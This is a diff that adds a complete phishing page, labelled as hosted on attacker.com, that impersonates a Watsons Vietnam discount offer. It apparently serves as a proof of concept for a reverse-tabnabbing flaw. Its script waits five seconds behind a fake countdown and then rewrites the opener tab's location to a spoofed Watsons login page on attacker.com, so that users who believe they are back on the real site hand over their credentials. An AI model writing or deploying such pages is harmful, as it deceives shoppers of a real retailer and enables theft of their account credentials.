@@ -1,0 +1,60 @@
+<!-- malicious-page.html on attacker.com -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Special Offer - Watsons Vietnam</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .countdown {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Limited Time Offer!</h1>
+        <p>Congratulations! You've won a 50% discount on all Watsons products.</p>
+        <div class="countdown" id="countdown">Redirecting in 5 seconds...</div>
+        <p>Please wait while we prepare your special discount...</p>
+    </div>
+
+    <script>
+        // Tabnabbing attack code
+        setTimeout(() => {
+            if (window.opener) {
+                try {
+                    // Redirect the opener tab to phishing page
+                    window.opener.location.href = 'https://attacker.com/phishing/watsons-login?origin=watsons.vn';
+                } catch (e) {
+                    // Fallback for browsers with partial protection
+                    console.error('Error accessing opener:', e);
+                }
+            }
+        }, 5000);
+
+        // Countdown timer
+        let seconds = 5;
+        const countdownElement = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            seconds--;
+            countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
+            if (seconds <= 0) {
+                clearInterval(interval);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
